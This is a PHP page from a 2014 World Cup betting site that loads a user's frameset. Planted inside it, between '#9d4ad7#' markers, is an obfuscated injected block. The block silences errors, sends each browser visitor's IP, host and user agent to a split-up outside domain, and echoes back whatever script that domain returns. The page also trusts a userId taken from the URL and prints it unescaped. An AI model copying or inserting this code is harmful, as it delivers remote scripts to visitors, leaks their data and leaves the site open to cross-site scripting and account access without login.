<?php
session_start();
$userId=$_GET["userId"];
$logout=$_GET["logout"];
if($logout==1)
{
	header("Location: ../util/login.php5");
	exit;
}
include_once("../util/dbutil.php5");
$userName=$dbutil->getUserName($userId);
if(!isset($_GET['userId']))
{
	header("Location: ../util/login.php5");
	exit;
}
?>
<?php
#9d4ad7#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/9d4ad7#
?>
<title>Werkes WM-Tipp</title>
<link rel="stylesheet" type="text/css" href="../../style/style-WM2014.css" />
<?php
echo "<frameset cols='280,*'>";
echo "<frame src='./overview.php5?userId=$userId' name='Navigation'>";
echo "<frame src='./userInfo.php5?userId=$userId' name='Daten'>";
echo "</frameset>";
?>